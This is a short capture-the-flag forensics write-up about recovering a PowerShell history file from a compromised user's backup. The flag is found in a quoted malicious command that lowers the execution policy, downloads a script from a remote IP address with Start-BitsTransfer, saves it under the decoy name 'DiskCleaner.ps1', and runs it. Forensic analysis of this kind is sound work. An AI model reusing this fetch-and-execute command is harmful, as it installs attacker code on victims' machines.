# Ping Pong - 3rd challenge in this chain

<img width="1191" height="566" alt="Pasted image 20260419193944" src="https://github.com/user-attachments/assets/e491111c-4b1d-41b3-a2f3-3a047b688592" />

To find the answer, we need to check what was the script that was executed.

The path for history of PowerShell commands run is as follows:

`/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine`

In the above directory, read `ConsoleHost_history.txt`

Output:-

```
ayush-parab@Ubuntu-VM:~/ayush/CTF/CITCTF2026/click_may_fixed/kurt_backup/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine$ more ConsoleHost_history.txt 
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
$p='unewhaven.com'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Desti
nation $c; & $c
```

From the above PowerShell script it is evident that we are pinging `unewhaven.com`

Flag - `CIT{unewhaven.com}`

---
* [🔙 Back to Digital Forensics Directory](../)
* [🔙 Back to Digital Forensics Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
